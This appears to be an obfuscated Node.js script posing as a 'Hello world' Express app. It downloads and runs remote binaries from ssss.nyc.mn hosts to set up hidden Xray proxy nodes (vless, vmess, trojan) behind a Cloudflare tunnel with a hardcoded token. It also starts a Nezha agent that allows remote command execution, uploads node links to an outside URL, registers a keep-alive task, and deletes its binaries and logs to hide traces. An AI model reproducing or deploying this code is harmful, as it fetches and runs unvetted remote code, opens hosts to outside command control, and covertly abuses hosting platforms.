const _0x3cb920=_0x45c0;(function(_0x1f03e9,_0x5d8fe4){const _0x149e81=_0x45c0,_0x3061b0=_0x1f03e9();while(!![]){try{const _0x375b3c=-parseInt(_0x149e81(0x19c))/0x1*(parseInt(_0x149e81(0x1e6))/0x2)+-parseInt(_0x149e81(0x136))/0x3+parseInt(_0x149e81(0x16a))/0x4+-parseInt(_0x149e81(0x186))/0x5*(-parseInt(_0x149e81(0x150))/0x6)+-parseInt(_0x149e81(0x1b9))/0x7*(-parseInt(_0x149e81(0x1ee))/0x8)+parseInt(_0x149e81(0x165))/0x9+-parseInt(_0x149e81(0x134))/0xa;if(_0x375b3c===_0x5d8fe4)break;else _0x3061b0['push'](_0x3061b0['shift']());}catch(_0x538f80){_0x3061b0['push'](_0x3061b0['shift']());}}}(_0x1808,0x7da0a));const express=require(_0x3cb920(0x1af)),app=express(),axios=require(_0x3cb920(0x1cf)),os=require('os'),fs=require('fs'),path=require(_0x3cb920(0x153)),{promisify}=require('util'),exec=promisify(require(_0x3cb920(0x1a3))[_0x3cb920(0x1de)]),{execSync}=require('child_process'),UPLOAD_URL=process['env']['UPLOAD_URL']||'',PROJECT_URL=process[_0x3cb920(0x1ac)][_0x3cb920(0x1bb)]||'',AUTO_ACCESS=process[_0x3cb920(0x1ac)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x3cb920(0x1ac)][_0x3cb920(0x13c)]||_0x3cb920(0x1b3),SUB_PATH=process[_0x3cb920(0x1ac)][_0x3cb920(0x1ea)]||'zuofeng',PORT=process[_0x3cb920(0x1ac)][_0x3cb920(0x146)]||process[_0x3cb920(0x1ac)][_0x3cb920(0x1c2)]||0xbb8,UUID=process[_0x3cb920(0x1ac)][_0x3cb920(0x19e)]||_0x3cb920(0x142),NEZHA_SERVER=process[_0x3cb920(0x1ac)][_0x3cb920(0x184)]||'',NEZHA_PORT=process[_0x3cb920(0x1ac)][_0x3cb920(0x1bf)]||'',NEZHA_KEY=process[_0x3cb920(0x1ac)][_0x3cb920(0x1ec)]||'',ARGO_DOMAIN=process['env'][_0x3cb920(0x1d2)]||_0x3cb920(0x14e),ARGO_AUTH=process[_0x3cb920(0x1ac)][_0x3cb920(0x1a6)]||_0x3cb920(0x1a7),ARGO_PORT=process[_0x3cb920(0x1ac)]['ARGO_PORT']||0x1f41,CFIP=process[_0x3cb920(0x1ac)][_0x3cb920(0x1e1)]||_0x3cb920(0x152),CFPORT=process[_0x3cb920(0x1ac)]['CFPORT']||0x1bb,NAME=process[_0x3cb920(0x1ac)]['NAME']||_0x3cb920(0x1d4);!fs[_0x3cb920(0x1be)](FILE_PATH)?(fs[_0x3cb920(0x13b)](FILE_PATH),console[_0x3cb920(0x197)](FILE_PATH+_0x3cb920(0x17e))):console[_0x3cb920(0x197)](FILE_PATH+_0x3cb920(0x1a5));function _0x1808(){const _0xa7dd28=['automatic\x20access\x20task\x20added\x20successfully','arm','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','list.txt','stringify','4571329MSbJoM','get','PROJECT_URL','clear','/api/add-subscriptions','existsSync','NEZHA_PORT','stream','quic','PORT','send','vless','length','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','trim','Content-Type','arch','Error\x20downloading\x20files:','rm\x20-rf\x20','status','block','/config.json\x20>/dev/null\x202>&1\x20&','axios','has','unshift','ARGO_DOMAIN','blackhole','railway','\x0avless://','http\x20server\x20is\x20running\x20on\x20port:','statSync','tls','\x0a\x20\x20tunnel:\x20','false','listen','127.0.0.1','https://arm64.ssss.nyc.mn/bot','exec','abcdefghijklmnopqrstuvwxyz','join','CFIP','2096','ARGO_DOMAIN:','sub.txt','error','20DroDjg','platform','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','nohup\x20','SUB_PATH','/api/delete-nodes','NEZHA_KEY','freedom','8LkfVfA','test','aarch64','https://amd64.ssss.nyc.mn/v1','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','fileUrl','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','push','\x20-s\x20','3663590UUvZsk','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','415878WdMnYA','\x20>\x20nul\x202>&1','\x20>/dev/null\x202>&1','fileName','\x0a\x20\x20\x0atrojan://','mkdirSync','FILE_PATH','\x20failed:\x20','pkill\x20-f\x20\x22[','https://arm64.ssss.nyc.mn/web','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','from','59531c29-ba6a-4251-b055-9e1da4611e3c','trojan','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','/tunnel.yml\x20run','SERVER_PORT','arm64','/vmess-argo','8443','data','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','charAt','Error\x20executing\x20command:\x20','railway.wans.netlib.re','base64','366awmenV','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','cdns.doon.eu.org','path','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','none','.exe\x20>\x20nul\x202>&1','tunnel.json','&fp=firefox&type=ws&host=','forEach','https://oooo.serv00.net/add-url','https+local://8.8.8.8/dns-query','readFileSync','https://arm64.ssss.nyc.mn/agent','TunnelSecret','\x22\x20>\x20/dev/null\x202>&1','443','xtls-rprx-vision','boot.log','\x0aclient_secret:\x20','2083','396819OmFJNw','http','text/plain;\x20charset=utf-8','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','Nodes\x20uploaded\x20successfully','3731152UpNeqw','catch','php\x20running\x20error:\x20','map','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','\x20is\x20running','true','filter','post','unlinkSync','match','\x0a\x20\x20\x0avmess://','finish','Skipping\x20adding\x20automatic\x20access\x20task','then','random','/trojan-argo','chmod','message','\x20is\x20created','?encryption=none&security=tls&sni=','all','includes','\x20>/dev/null\x202>&1\x20&','split','NEZHA_SERVER','\x20-p\x20','33295CVyMpV','utf-8','taskkill\x20/f\x20/im\x20','?security=tls&sni=','floor','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','npm\x20running\x20error:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','\x20successfully','https://amd64.ssss.nyc.mn/web','readdirSync','win32','config.json','basename','ArgoDomain:','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','del\x20/f\x20/q\x20','log','application/json','direct','substring','/sub.txt\x20saved\x20successfully','101657ZZoTzY','Empowerment\x20success\x20for\x20','UUID','Error\x20reading\x20boot.log:','Unhandled\x20error\x20in\x20startserver:','set','writeFileSync','child_process','close','\x20already\x20exists','ARGO_AUTH','eyJhIjoiNTAyODU3NmMxOTVhNTBlMGE0NGY5ZTM0YWNhZmQwM2UiLCJ0IjoiYjQzMGU2NDMtZDFmMi00MjBlLWE1NjgtYTdlNTJkZjhiNWZmIiwicyI6IllUQXdORFF3TW1VdE4yUmxOeTAwTW1FMExUazNZelV0TkdSbE1UQTFNekEwT1RsbCJ9','2087','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','pop','Download\x20','env','createWriteStream','config.yaml','express','2053','isFile','toString','./tmp'];_0x1808=function(){return _0xa7dd28;};return _0x1808();}function generateRandomName(){const _0x574aa6=_0x3cb920,_0x4b02aa=_0x574aa6(0x1df);let _0x1edd12='';for(let _0x24069f=0x0;_0x24069f<0x6;_0x24069f++){_0x1edd12+=_0x4b02aa[_0x574aa6(0x14c)](Math[_0x574aa6(0x18a)](Math[_0x574aa6(0x17a)]()*_0x4b02aa['length']));}return _0x1edd12;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x3cb920(0x1e0)](FILE_PATH,npmName),phpPath=path[_0x3cb920(0x1e0)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x3cb920(0x1e0)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x3cb920(0x1e4)),listPath=path['join'](FILE_PATH,_0x3cb920(0x1b7)),bootLogPath=path[_0x3cb920(0x1e0)](FILE_PATH,_0x3cb920(0x162)),configPath=path['join'](FILE_PATH,'config.json');function _0x45c0(_0x3518c9,_0x50e927){const _0x1808c6=_0x1808();return _0x45c0=function(_0x45c01f,_0x548b74){_0x45c01f=_0x45c01f-0x131;let _0x248c69=_0x1808c6[_0x45c01f];return _0x248c69;},_0x45c0(_0x3518c9,_0x50e927);}function deleteNodes(){const _0x290ef2=_0x3cb920;try{if(!UPLOAD_URL)return;if(!fs[_0x290ef2(0x1be)](subPath))return;let _0x9b4880;try{_0x9b4880=fs['readFileSync'](subPath,_0x290ef2(0x187));}catch{return null;}const _0x3a0ba4=Buffer[_0x290ef2(0x141)](_0x9b4880,_0x290ef2(0x14f))[_0x290ef2(0x1b2)](_0x290ef2(0x187)),_0x4e6523=_0x3a0ba4[_0x290ef2(0x183)]('\x0a')['filter'](_0x332628=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x290ef2(0x1ef)](_0x332628));if(_0x4e6523[_0x290ef2(0x1c5)]===0x0)return;return axios['post'](UPLOAD_URL+_0x290ef2(0x1eb),JSON['stringify']({'nodes':_0x4e6523}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x2e4126=>{return null;}),null;}catch(_0x5d917a){return null;}}function cleanupOldFiles(){const _0x585c76=_0x3cb920;try{const _0x4684d9=fs[_0x585c76(0x190)](FILE_PATH);_0x4684d9[_0x585c76(0x159)](_0xaefe99=>{const _0xc09a86=_0x585c76,_0x2b7ae3=path['join'](FILE_PATH,_0xaefe99);try{const _0x5ad7d0=fs[_0xc09a86(0x1d7)](_0x2b7ae3);_0x5ad7d0[_0xc09a86(0x1b1)]()&&fs[_0xc09a86(0x174)](_0x2b7ae3);}catch(_0x20976d){}});}catch(_0x3c5cd1){}}app[_0x3cb920(0x1ba)]('/',function(_0x206973,_0x31581f){_0x31581f['send']('Hello\x20world!');});async function generateConfig(){const _0x43d387=_0x3cb920,_0x3e37e9={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x43d387(0x155)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x43d387(0x1c4),'settings':{'clients':[{'id':UUID,'flow':_0x43d387(0x161)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x43d387(0x17b),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x43d387(0x1dc),'protocol':_0x43d387(0x1c4),'settings':{'clients':[{'id':UUID}],'decryption':_0x43d387(0x155)},'streamSettings':{'network':'tcp','security':'none'}},{'port':0xbba,'listen':_0x43d387(0x1dc),'protocol':_0x43d387(0x1c4),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x43d387(0x155)},'streamSettings':{'network':'ws','security':_0x43d387(0x155),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x43d387(0x166),'tls',_0x43d387(0x1c1)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x43d387(0x1dc),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x43d387(0x148)}},'sniffing':{'enabled':!![],'destOverride':[_0x43d387(0x166),_0x43d387(0x1d8),_0x43d387(0x1c1)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x43d387(0x1dc),'protocol':_0x43d387(0x143),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x43d387(0x166),'tls',_0x43d387(0x1c1)],'metadataOnly':![]}}],'dns':{'servers':[_0x43d387(0x15b)]},'outbounds':[{'protocol':_0x43d387(0x1ed),'tag':_0x43d387(0x199)},{'protocol':_0x43d387(0x1d3),'tag':_0x43d387(0x1cd)}]};fs[_0x43d387(0x1a2)](path['join'](FILE_PATH,_0x43d387(0x192)),JSON[_0x43d387(0x1b8)](_0x3e37e9,null,0x2));}function getSystemArchitecture(){const _0x1829a1=_0x3cb920,_0x4f7e4a=os[_0x1829a1(0x1c9)]();return _0x4f7e4a===_0x1829a1(0x1b5)||_0x4f7e4a===_0x1829a1(0x147)||_0x4f7e4a===_0x1829a1(0x1f0)?_0x1829a1(0x1b5):'amd';}function downloadFile(_0x5b2cae,_0x25dd38,_0x307ba3){const _0x4fcd58=_0x3cb920,_0x15dbdf=_0x5b2cae;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x29c4f1=fs[_0x4fcd58(0x1ad)](_0x15dbdf);axios({'method':_0x4fcd58(0x1ba),'url':_0x25dd38,'responseType':_0x4fcd58(0x1c0)})[_0x4fcd58(0x179)](_0x1c9832=>{const _0x505d9c=_0x4fcd58;_0x1c9832[_0x505d9c(0x14a)]['pipe'](_0x29c4f1),_0x29c4f1['on'](_0x505d9c(0x177),()=>{const _0x806ca=_0x505d9c;_0x29c4f1[_0x806ca(0x1a4)](),console['log'](_0x806ca(0x1ab)+path[_0x806ca(0x193)](_0x15dbdf)+_0x806ca(0x18e)),_0x307ba3(null,_0x15dbdf);}),_0x29c4f1['on'](_0x505d9c(0x1e5),_0x2d9926=>{const _0x4350b3=_0x505d9c;fs['unlink'](_0x15dbdf,()=>{});const _0x1a7ea2=_0x4350b3(0x1ab)+path['basename'](_0x15dbdf)+_0x4350b3(0x13d)+_0x2d9926['message'];console['error'](_0x1a7ea2),_0x307ba3(_0x1a7ea2);});})[_0x4fcd58(0x16b)](_0x1b5f2a=>{const _0x4eabf9=_0x4fcd58,_0x50b9e6=_0x4eabf9(0x1ab)+path[_0x4eabf9(0x193)](_0x15dbdf)+_0x4eabf9(0x13d)+_0x1b5f2a['message'];console['error'](_0x50b9e6),_0x307ba3(_0x50b9e6);});}async function downloadFilesAndRun(){const _0x17715f=_0x3cb920,_0x4f3b02=getSystemArchitecture(),_0x46076f=getFilesForArchitecture(_0x4f3b02);if(_0x46076f[_0x17715f(0x1c5)]===0x0){console[_0x17715f(0x197)](_0x17715f(0x14b));return;}const _0x13c49c=_0x46076f[_0x17715f(0x16d)](_0x2bcbde=>{return new Promise((_0x3ebafb,_0x472aa9)=>{const _0x43035e=_0x45c0;downloadFile(_0x2bcbde[_0x43035e(0x139)],_0x2bcbde[_0x43035e(0x1f3)],(_0x1f4af7,_0x277e67)=>{_0x1f4af7?_0x472aa9(_0x1f4af7):_0x3ebafb(_0x277e67);});});});try{await Promise[_0x17715f(0x180)](_0x13c49c);}catch(_0x1b1bba){console[_0x17715f(0x1e5)](_0x17715f(0x1ca),_0x1b1bba);return;}function _0x5b531e(_0x287eb8){const _0x569c4b=_0x17715f,_0x5a64e0=0x1fd;_0x287eb8[_0x569c4b(0x159)](_0x5c12c9=>{const _0x2d912b=_0x569c4b;fs['existsSync'](_0x5c12c9)&&fs[_0x2d912b(0x17c)](_0x5c12c9,_0x5a64e0,_0x20a118=>{const _0x4b5ee2=_0x2d912b;_0x20a118?console[_0x4b5ee2(0x1e5)]('Empowerment\x20failed\x20for\x20'+_0x5c12c9+':\x20'+_0x20a118):console[_0x4b5ee2(0x197)](_0x4b5ee2(0x19d)+_0x5c12c9+':\x20'+_0x5a64e0['toString'](0x8));});});}const _0x307bec=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5b531e(_0x307bec);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x755a91=NEZHA_SERVER[_0x17715f(0x181)](':')?NEZHA_SERVER[_0x17715f(0x183)](':')[_0x17715f(0x1aa)]():'',_0x166eb0=new Set([_0x17715f(0x160),_0x17715f(0x149),_0x17715f(0x1e2),_0x17715f(0x1a8),_0x17715f(0x164),_0x17715f(0x1b0)]),_0x4a7c1f=_0x166eb0[_0x17715f(0x1d0)](_0x755a91)?_0x17715f(0x171):_0x17715f(0x1da),_0x56bb88=_0x17715f(0x163)+NEZHA_KEY+_0x17715f(0x18d)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x4a7c1f+_0x17715f(0x1b6)+UUID;fs[_0x17715f(0x1a2)](path[_0x17715f(0x1e0)](FILE_PATH,_0x17715f(0x1ae)),_0x56bb88);const _0x5eed25=_0x17715f(0x1e9)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x17715f(0x168);try{await exec(_0x5eed25),console['log'](phpName+_0x17715f(0x170)),await new Promise(_0xbc8cc1=>setTimeout(_0xbc8cc1,0x3e8));}catch(_0x416b14){console['error'](_0x17715f(0x16c)+_0x416b14);}}else{let _0x3339fc='';const _0x348fa2=['443',_0x17715f(0x149),_0x17715f(0x1e2),_0x17715f(0x1a8),_0x17715f(0x164),_0x17715f(0x1b0)];_0x348fa2[_0x17715f(0x181)](NEZHA_PORT)&&(_0x3339fc='--tls');const _0x40ed31='nohup\x20'+npmPath+_0x17715f(0x133)+NEZHA_SERVER+':'+NEZHA_PORT+_0x17715f(0x185)+NEZHA_KEY+'\x20'+_0x3339fc+_0x17715f(0x1a9);try{await exec(_0x40ed31),console[_0x17715f(0x197)](npmName+_0x17715f(0x170)),await new Promise(_0x175fe5=>setTimeout(_0x175fe5,0x3e8));}catch(_0x57ae19){console[_0x17715f(0x1e5)](_0x17715f(0x18c)+_0x57ae19);}}}else console[_0x17715f(0x197)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x512174=_0x17715f(0x1e9)+webPath+'\x20-c\x20'+FILE_PATH+_0x17715f(0x1ce);try{await exec(_0x512174),console[_0x17715f(0x197)](webName+_0x17715f(0x170)),await new Promise(_0x3eb7f1=>setTimeout(_0x3eb7f1,0x3e8));}catch(_0x59eee5){console[_0x17715f(0x1e5)]('web\x20running\x20error:\x20'+_0x59eee5);}if(fs[_0x17715f(0x1be)](botPath)){let _0x311a43;if(ARGO_AUTH[_0x17715f(0x175)](/^[A-Z0-9a-z=]{120,250}$/))_0x311a43=_0x17715f(0x16e)+ARGO_AUTH;else ARGO_AUTH[_0x17715f(0x175)](/TunnelSecret/)?_0x311a43=_0x17715f(0x151)+FILE_PATH+_0x17715f(0x145):_0x311a43=_0x17715f(0x1f2)+FILE_PATH+_0x17715f(0x135)+ARGO_PORT;try{await exec(_0x17715f(0x1e9)+botPath+'\x20'+_0x311a43+_0x17715f(0x182)),console[_0x17715f(0x197)](botName+_0x17715f(0x170)),await new Promise(_0xd2f170=>setTimeout(_0xd2f170,0x7d0));}catch(_0x5f10b4){console['error']('Error\x20executing\x20command:\x20'+_0x5f10b4);}}await new Promise(_0x2ff525=>setTimeout(_0x2ff525,0x1388));}function getFilesForArchitecture(_0x2b36c5){const _0x6c65fa=_0x3cb920;let _0x2b0d6a;_0x2b36c5===_0x6c65fa(0x1b5)?_0x2b0d6a=[{'fileName':webPath,'fileUrl':_0x6c65fa(0x13f)},{'fileName':botPath,'fileUrl':_0x6c65fa(0x1dd)}]:_0x2b0d6a=[{'fileName':webPath,'fileUrl':_0x6c65fa(0x18f)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2eb6a9=_0x2b36c5===_0x6c65fa(0x1b5)?_0x6c65fa(0x15d):'https://amd64.ssss.nyc.mn/agent';_0x2b0d6a['unshift']({'fileName':npmPath,'fileUrl':_0x2eb6a9});}else{const _0x61997b=_0x2b36c5==='arm'?'https://arm64.ssss.nyc.mn/v1':_0x6c65fa(0x1f1);_0x2b0d6a[_0x6c65fa(0x1d1)]({'fileName':phpPath,'fileUrl':_0x61997b});}}return _0x2b0d6a;}function argoType(){const _0x46f09d=_0x3cb920;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x46f09d(0x197)](_0x46f09d(0x144));return;}if(ARGO_AUTH[_0x46f09d(0x181)](_0x46f09d(0x15e))){fs[_0x46f09d(0x1a2)](path[_0x46f09d(0x1e0)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x2af581=_0x46f09d(0x1d9)+ARGO_AUTH[_0x46f09d(0x183)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x46f09d(0x1e0)](FILE_PATH,_0x46f09d(0x157))+_0x46f09d(0x1e8)+ARGO_DOMAIN+_0x46f09d(0x195)+ARGO_PORT+_0x46f09d(0x18b);fs[_0x46f09d(0x1a2)](path['join'](FILE_PATH,'tunnel.yml'),_0x2af581);}else console[_0x46f09d(0x197)](_0x46f09d(0x154));}argoType();async function extractDomains(){const _0x35249a=_0x3cb920;let _0x51c616;if(ARGO_AUTH&&ARGO_DOMAIN)_0x51c616=ARGO_DOMAIN,console['log'](_0x35249a(0x1e3),_0x51c616),await _0x1fef9d(_0x51c616);else try{const _0x5401c2=fs[_0x35249a(0x15c)](path[_0x35249a(0x1e0)](FILE_PATH,_0x35249a(0x162)),_0x35249a(0x187)),_0x27f9d3=_0x5401c2[_0x35249a(0x183)]('\x0a'),_0x594692=[];_0x27f9d3[_0x35249a(0x159)](_0x3592ce=>{const _0x15bd4e=_0x35249a,_0x48d846=_0x3592ce[_0x15bd4e(0x175)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x48d846){const _0x54bf18=_0x48d846[0x1];_0x594692[_0x15bd4e(0x132)](_0x54bf18);}});if(_0x594692['length']>0x0)_0x51c616=_0x594692[0x0],console[_0x35249a(0x197)](_0x35249a(0x194),_0x51c616),await _0x1fef9d(_0x51c616);else{console[_0x35249a(0x197)](_0x35249a(0x131)),fs['unlinkSync'](path[_0x35249a(0x1e0)](FILE_PATH,_0x35249a(0x162)));async function _0x189be8(){const _0x47df6d=_0x35249a;try{process[_0x47df6d(0x1e7)]===_0x47df6d(0x191)?await exec(_0x47df6d(0x188)+botName+_0x47df6d(0x156)):await exec(_0x47df6d(0x13e)+botName[_0x47df6d(0x14c)](0x0)+']'+botName[_0x47df6d(0x19a)](0x1)+_0x47df6d(0x15f));}catch(_0x3e6098){}}_0x189be8(),await new Promise(_0x3719a0=>setTimeout(_0x3719a0,0xbb8));const _0x550b41='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x35249a(0x135)+ARGO_PORT;try{await exec(_0x35249a(0x1e9)+botPath+'\x20'+_0x550b41+_0x35249a(0x182)),console['log'](botName+_0x35249a(0x170)),await new Promise(_0x47f748=>setTimeout(_0x47f748,0xbb8)),await extractDomains();}catch(_0x919c39){console[_0x35249a(0x1e5)](_0x35249a(0x14d)+_0x919c39);}}}catch(_0xf906){console[_0x35249a(0x1e5)](_0x35249a(0x19f),_0xf906);}async function _0x1fef9d(_0x1202a2){const _0x7c0526=_0x35249a,_0x13bdc6=execSync(_0x7c0526(0x1c6),{'encoding':_0x7c0526(0x187)}),_0x3f2f28=_0x13bdc6[_0x7c0526(0x1c7)](),_0x37593a=NAME?NAME+'-'+_0x3f2f28:_0x3f2f28;return new Promise(_0x46babd=>{setTimeout(()=>{const _0x32b439=_0x45c0,_0x7077ce={'v':'2','ps':''+_0x37593a,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x32b439(0x155),'net':'ws','type':_0x32b439(0x155),'host':_0x1202a2,'path':'/vmess-argo?ed=2560','tls':_0x32b439(0x1d8),'sni':_0x1202a2,'alpn':'','fp':'firefox'},_0x37bff7=_0x32b439(0x1d5)+UUID+'@'+CFIP+':'+CFPORT+_0x32b439(0x17f)+_0x1202a2+'&fp=firefox&type=ws&host='+_0x1202a2+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x37593a+_0x32b439(0x176)+Buffer['from'](JSON[_0x32b439(0x1b8)](_0x7077ce))[_0x32b439(0x1b2)](_0x32b439(0x14f))+_0x32b439(0x13a)+UUID+'@'+CFIP+':'+CFPORT+_0x32b439(0x189)+_0x1202a2+_0x32b439(0x158)+_0x1202a2+_0x32b439(0x16f)+_0x37593a+'\x0a\x20\x20\x20\x20';console[_0x32b439(0x197)](Buffer[_0x32b439(0x141)](_0x37bff7)[_0x32b439(0x1b2)]('base64')),fs[_0x32b439(0x1a2)](subPath,Buffer[_0x32b439(0x141)](_0x37bff7)[_0x32b439(0x1b2)](_0x32b439(0x14f))),console[_0x32b439(0x197)](FILE_PATH+_0x32b439(0x19b)),uploadNodes(),app[_0x32b439(0x1ba)]('/'+SUB_PATH,(_0x41f632,_0xf396a2)=>{const _0x31ace=_0x32b439,_0x167d99=Buffer[_0x31ace(0x141)](_0x37bff7)[_0x31ace(0x1b2)](_0x31ace(0x14f));_0xf396a2[_0x31ace(0x1a1)](_0x31ace(0x1c8),_0x31ace(0x167)),_0xf396a2[_0x31ace(0x1c3)](_0x167d99);}),_0x46babd(_0x37bff7);},0x7d0);});}}async function uploadNodes(){const _0x5d4aff=_0x3cb920;if(UPLOAD_URL&&PROJECT_URL){const _0x9c2d20=PROJECT_URL+'/'+SUB_PATH,_0x5c767f={'subscription':[_0x9c2d20]};try{const _0x489704=await axios[_0x5d4aff(0x173)](UPLOAD_URL+_0x5d4aff(0x1bd),_0x5c767f,{'headers':{'Content-Type':_0x5d4aff(0x198)}});return _0x489704&&_0x489704[_0x5d4aff(0x1cc)]===0xc8?(console[_0x5d4aff(0x197)]('Subscription\x20uploaded\x20successfully'),_0x489704):null;}catch(_0x1478a7){if(_0x1478a7['response']){if(_0x1478a7['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x3047de=fs['readFileSync'](listPath,_0x5d4aff(0x187)),_0x17c529=_0x3047de['split']('\x0a')[_0x5d4aff(0x172)](_0x23edb7=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x23edb7));if(_0x17c529['length']===0x0)return;const _0x22338e=JSON[_0x5d4aff(0x1b8)]({'nodes':_0x17c529});try{const _0x4ebc6c=await axios['post'](UPLOAD_URL+'/api/add-nodes',_0x22338e,{'headers':{'Content-Type':'application/json'}});return _0x4ebc6c&&_0x4ebc6c['status']===0xc8?(console[_0x5d4aff(0x197)](_0x5d4aff(0x169)),_0x4ebc6c):null;}catch(_0x10dc21){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5a89af=_0x45c0,_0x36724e=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x36724e[_0x5a89af(0x132)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x36724e[_0x5a89af(0x132)](phpPath);process[_0x5a89af(0x1e7)]==='win32'?exec(_0x5a89af(0x196)+_0x36724e[_0x5a89af(0x1e0)]('\x20')+_0x5a89af(0x137),_0x436a5e=>{const _0x2e371f=_0x5a89af;console[_0x2e371f(0x1bc)](),console[_0x2e371f(0x197)]('App\x20is\x20running'),console[_0x2e371f(0x197)](_0x2e371f(0x140));}):exec(_0x5a89af(0x1cb)+_0x36724e[_0x5a89af(0x1e0)]('\x20')+_0x5a89af(0x138),_0x250e28=>{const _0x11483c=_0x5a89af;console[_0x11483c(0x1bc)](),console[_0x11483c(0x197)]('App\x20is\x20running'),console[_0x11483c(0x197)](_0x11483c(0x140));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x24555d=_0x3cb920;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x24555d(0x197)](_0x24555d(0x178));return;}try{const _0x1a74cf=await axios['post'](_0x24555d(0x15a),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x24555d(0x197)](_0x24555d(0x1b4)),_0x1a74cf;}catch(_0x2fdd5e){return console[_0x24555d(0x1e5)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x2fdd5e[_0x24555d(0x17d)]),null;}}async function startserver(){const _0x42eb0f=_0x3cb920;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x358f24){console[_0x42eb0f(0x1e5)]('Error\x20in\x20startserver:',_0x358f24);}}startserver()[_0x3cb920(0x16b)](_0x1945ab=>{const _0x223455=_0x3cb920;console[_0x223455(0x1e5)](_0x223455(0x1a0),_0x1945ab);}),app[_0x3cb920(0x1db)](PORT,()=>console['log'](_0x3cb920(0x1d6)+PORT+'!'));
